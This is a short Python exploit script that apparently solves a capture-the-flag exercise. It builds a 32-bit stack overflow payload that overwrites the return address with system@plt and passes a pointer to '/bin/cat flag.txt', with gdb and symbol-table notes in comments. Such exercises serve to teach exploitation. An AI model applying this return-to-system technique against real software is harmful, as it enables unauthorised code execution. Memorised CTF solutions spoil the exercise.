#!/usr/bin/python
import sys
import struct

# run < <(python challenge.py)
# break *0x0804860b

# Symbol table '.symtab' contains 73 entries:
#    Num:    Value  Size Type    Bind   Vis      Ndx Name
#     37: 0804860c    25 FUNC    LOCAL  DEFAULT   14 usefulFunction
#     60: 0804a030    18 OBJECT  GLOBAL DEFAULT   24 usefulString

# Relocation section '.rel.plt' at offset 0x33c contains 7 entries:
# 0804a018  00000407 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0

# In statically addressed parts of memory, so this works with ASLR:
# 0x080483e0     system@plt
# 0x0804a030     /bin/cat flag.txt

system_plt = b'\xe0\x83\x04\x08'
# system_plt = b'\x18\xa0\x04\x08'
cat_flag   = b'\x30\xa0\x04\x08'
deadcode   = b'\xde\xc0\xad\xde'  # 0xdeadc0de

payload = b'A'*40
payload += b'B'*4       # ebp
payload += system_plt   # eip
payload += deadcode     # return for system()
payload += cat_flag     # cmd for system()

sys.stdout.buffer.write(payload)
